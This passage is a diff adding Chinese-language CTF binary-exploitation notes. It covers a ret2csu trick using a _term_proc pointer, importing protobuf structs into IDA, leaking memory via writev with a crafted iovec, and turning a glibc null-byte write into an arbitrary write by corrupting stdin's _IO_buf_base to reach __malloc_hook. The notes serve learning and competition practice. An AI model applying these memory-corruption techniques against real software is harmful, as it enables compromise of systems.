+有的时候程序里面不含有`rdx`的`gadget`，但含有`csu`的`gadget`可以使用来控制`rdx`，而`csu`必须来`call`一个存放某个函数的地址（通常是`got`表），若我们不含有这样的地址，则难以使用`csu`。
+
+此时可以通过`call`一个指向`_term_proc`函数的地址来完成这个操作。`_term_proc`如下所示：
+
+```c
+.fini:0000000000400804 ; void term_proc()
+.fini:0000000000400804                 public _term_proc
+.fini:0000000000400804 _term_proc      proc near
+.fini:0000000000400804                 sub     rsp, 8          ; _fini
+.fini:0000000000400808                 add     rsp, 8
+.fini:000000000040080C                 retn
+.fini:000000000040080C _term_proc      endp
+.fini:000000000040080C
+.fini:000000000040080C _fini           ends
+```
+
+注意，在`csu`中我们的`call`需要传递一个执行`_term_proc`函数的指针而不是其本身的地址。这个地址可以在`LOAD`段找到：
+
+```assembly
+LOAD:0000000000600E28 _DYNAMIC        Elf64_Dyn <1, 1>        ; DATA XREF: LOAD:0000000000400130↑o
+LOAD:0000000000600E28                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o
+LOAD:0000000000600E28                                         ; DT_NEEDED libc.so.6
+LOAD:0000000000600E38                 Elf64_Dyn <0Ch, 400520h> ; DT_INIT
+LOAD:0000000000600E48                 dq 0Dh                  ; d_tag ; DT_FINI
+LOAD:0000000000600E50                 dq 400804h              ; d_un
+LOAD:0000000000600E58                 Elf64_Dyn <19h, 600E10h> ; DT_INIT_ARRAY
+```
+
+如上所示，`0x600e50`处存放了一个指向`_term_proc`的指针。因此可以通过`call`这个`0x600e50`来达到`csu`仅设置寄存器的值而不直接调用函数的目的。
+
+# 使用ida导入C语言结构体
+
+复现国赛`strangeTalkBot`的时候学到的。
+
+## 编辑头文件，注释不需要的部分
+
+例如，我需要导入`protobuf`的结构体，那么我首先需要编辑`/usr/include/`下的文件，这是`C`语言`include`的默认文件夹。
+
+以`protobuf`的结构体为例：
+
+编辑`/usr/include/protobuf-c/protobuf-c.h`，注释如下部分：
+
+```c
+// #include <assert.h>
+// #include <limits.h>
+// #include <stddef.h>
+// #include <stdint.h>
+```
+
+我们需要注释所有无关部分。（完成后记得恢复！）
+
+## ida中导入文件
+
+左上角`File -> Load File -> Parse C header file `，选择刚刚编辑好的头文件，导入。
+
+## 将导入的文件添加到结构体
+
+刚刚我们只是导入了这些变量，没有将他们设置为结构体。
+
+按下`shift + F9`打开`structure`页面，添加结构体，可以用如下两种方式：
+
+- 按下`insert`
+
+- 如果你没有`insert`键，鼠标右键空白部分，点击`add stru type`。
+
+接下来点击`add standard structure`，选择要导入的结构体即可：
+
+![image-20240508170826480](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405081708728.png)
+
+## 应用到数据
+
+鼠标移动到你认为是该结构体的地址的起始处，如图所示：
+
+![image-20240508170927270](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405081709355.png)
+
+点击`ida`左上角的`edit`，`struct var`，选中要应用的结构体即可，如下所示：
+
+![image-20240508171034108](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405081710183.png)
+
+接下来，通过同样的方式，可以应用`ProtobufCFieldDescriptor`结构体到数据部分，如下所示：
+
+可见，这大大帮助我们减少了逆向的难度，例如`type`等字段已经被设置为其变量名。
+
+![image-20240508171444081](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405081714148.png)
+
+# writev系统调用
+
+可以代替`write`。其中：
+
+```c
+ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
+fd：要写入数据的文件描述符。
+iov：指向一个iovec结构数组的指针，每个结构包含一个指向数据缓冲区的指针和该缓冲区的长度。
+iovcnt：iovec结构数组中元素的数量。
+```
+
+由此，例如我需要输出`0x80000`处的长度为`0x100`的数据，我可以先在堆上构造这个`iovec`结构体：
+
+```c
+payload = p64(0x80000) + p64(0x100)
+```
+
+假设构造的这个`payload`位于地址`heap_base + 0x360`，那么使用`writev`如下即可：
+
+```c
+writev(1, heap_base + 0x360, 1)
+```
+
+# libc任意地址写0：通过_IO_buf_base任意写
+
+在`glibc`题目中，有时候题目会给一个`glibc`任意地址写一个`0`，例如`whctf2017_stackoverflow`，以及`r3ctf_2024`的`Nullullullllu`。
+
+此时我们可以考虑写`_IO_2_1_stdin_`的`_IO_buf_base`。
+
+先说原理。当我们调用`scanf`函数时，最终会执行如下函数：
+
+```c
+count = _IO_SYSREAD(fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);
+```
+
+可以看到，实际上就是一个`read`，起始位置为`_IO_buf_base`。而`_IO_2_1_stdin_`的原本值可能就是`_IO_2_1_stdin_`附近的值，因此若我们写`_IO_buf_base`的最低字节为`0`，那么我们很有可能可以**让`_IO_buf_base`和`_IO_buf_end`之间包括`_IO_buf_base`**，如果满足，我们便又可以控制`_IO_buf_base`，并使其指向任何我们想要写的地方，完成一个任意地址写！
+
+而要执行刚刚代码块中的那一行函数，需要绕过以下条件：
+
+```c
+if (fp->_IO_read_ptr < fp->_IO_read_end)
+	return *(unsigned char *)fp->_IO_read_ptr;
+// 假如_IO_read_ptr<_IO_read_end就不能执行到我们的read
+```
+
+因此，我们还需要让`_IO_read_end`等于`_IO_read_ptr`。
+
+那么如何完成这个操作呢？下面我以题目中的情景举例：
+
+在题目中，我覆盖掉`_IO_buf_base`的最低字节为`0`后，我控制到的是`_IO_write_base`开始的地方，我填充了`0x18`个字符`a`，并写`_IO_buf_base`为`__malloc_hook`，写`_IO_buf_end`为`__malloc_hook + 8`。因此，倘若满足条件，我下一次`scanf`函数就可以往`__malloc_hook`写入我想写入的值。
+
+```c
+{
+  file = {
+    _flags = 0xfbad208b,
+    _IO_read_ptr = 0x7f95e4985900,
+    _IO_read_end = 0x7f95e4985928,
+    _IO_read_base = 0x7f95e4985900,
+    _IO_write_base = 0x6161616161616161,
+    _IO_write_ptr = 0x6161616161616161,
+    _IO_write_end = 0x6161616161616161,
+    _IO_buf_base = 0x7f95e4985b10,
+    _IO_buf_end = 0x7f95e4985b18,
+    _IO_save_base = 0x0,
+    _IO_backup_base = 0x0,
+    _IO_save_end = 0x0,
+    _markers = 0x0,
+    _chain = 0x0,
+    _fileno = 0x0,
+    _flags2 = 0x0,
+    _old_offset = 0xffffffffffffffff,
+    _cur_column = 0x0,
+    _vtable_offset = 0x0,
+    _shortbuf = {0xa},
+    _lock = 0x7f95e4987790,
+    _offset = 0xffffffffffffffff,
+    _codecvt = 0x0,
+    _wide_data = 0x7f95e49859c0,
+    _freeres_list = 0x0,
+    _freeres_buf = 0x0,
+    __pad5 = 0x0,
+    _mode = 0xffffffff,
+    _unused2 = {0x0 <repeats 20 times>}
+  },
+  vtable = 0x7f95e49846e0
+}
+```
+
+然而，我们注意到此时`_IO_read_ptr`和`_IO_read_end`的状态：`_IO_read_end > _IO_read_ptr`。因此`scanf`会正常获得数据，而不是往`__malloc_hook`写入数据。
+
+**而题目中有`IO_getc(stdin);`函数供我们使用。**该函数本意是清除缓冲区中`scanf`留下的换行符，而经过我们实测，该函数可以使得`_IO_read_ptr`的值`+1`。因此，在上述`_IO_2_1_stdin_`的结构体中，我们只需要执行`0x28`次`IO_getc(stdin)`，即可使得`_IO_read_ptr = _IO_read_end`！
+
+**除了`IO_getc(stdin)`函数，`getchar()`也有同样的作用。**
+
+此外需要注意：
+
+- `scanf`正常情况下我们通过`sendline`来输入，因为正常情况下`scanf`以换行符为分隔。
+- 而我们往`_IO_buf_base`输入时，使用`send`，不需要换行符。
